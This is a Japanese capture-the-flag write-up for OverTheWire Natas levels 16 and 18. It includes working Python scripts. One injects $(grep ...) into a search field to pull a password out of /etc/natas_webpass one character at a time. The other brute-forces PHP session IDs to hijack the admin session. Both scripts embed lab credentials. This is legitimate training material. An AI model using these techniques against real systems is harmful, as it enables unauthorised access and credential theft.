レベル16


ソースコードから判断すると、すべてのサービス文字はフィルター処理され、文字列は引用符で送信されるため、2つのファイルからの「接着」の転送は不可能です。



$（cmd）のような構造を使用すると、「キー」の出力を制御できます。



アイデアはこれです：
  1. grep -i“ key” file.txtコンストラクト、keyが空の文字列の場合、ファイル全体が表示されます。
  2. ファイルにはパスワードが1行しかないため、その出力を制御できます。
  3. $（cmd）コンストラクト内のgrepに正規表現を渡すことにより、-iパラメーターでパスワード（パスワードの先頭を推測した場合）を含む行を出力し、dictionary.txtから行を出力しないか、またはパスワードは空の文字列になり、dictionary.txtファイル全体が表示されます。

import httplib
import urllib
import re
import base64

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
count = 0

headers = {}
conn = httplib.HTTPConnection("natas16.natas.labs.overthewire.org")
headers["Authorization"] = "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="  

count = 0
passwd = ""
while count != 32:
	for i in range(len(charset)):
		needle = urllib.quote_plus("$(grep -E ^" + passwd + charset[i] +".* /etc/natas_webpass/natas17)Afr")
		conn.request("GET", "/?needle=" + needle + "&submit=Search", "", headers)
		r1 = conn.getresponse()
		data = r1.read()
		if(data.count("African") == 0):
			passwd += charset[i:i+1]
			print(str(count) + " : " + str(passwd))
			count += 1
			break
		conn.close()
print("Password : " + passwd)



パスワードを取得しました。

レベル18


ソースコードを分析してみましょう。



最初のステップは、ブラウザでCookieが設定されているかどうかを確認することです（関数my_session_start（））。



タスク内でCookieを制御するものは何もないため、それらを設定する必要があります。つまり、関数はfalseを返し、ルートコードでelseブランチに移動します。ユーザー名とパスワードのフィールドの入力を確認します。session_id（）関数は、1から640までの範囲の乱数を受け入れ（このような制限がある理由は非常に奇妙です）、session_start（）関数の設定を作成します。





次に、username ==「admin」がチェックされます。管理者としてログインすると、このことが通知され、次のレベルのパスワードが与えられます。



ソリューションのアイデア：ID範囲はユーザーに対して定義されます。IDが1から640のページに移動するブルートフォースファイルを作成します。
import requests
from requests.auth import HTTPBasicAuth
import binascii
host = 'http://natas19.natas.labs.overthewire.org/'
auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
params = {'username':'admin', 'password':'admin'}

for i in range(0, 640):
	print(i)
	phpsessid = binascii.hexlify(str(i)+"-admin")
	cookies={'PHPSESSID':phpsessid}
	r = requests.get(host, params=params, cookies=cookies, auth=auth)
	if('Password' in r.content):
		print(r.content)
		break



id = 119のパスワードを取得します。
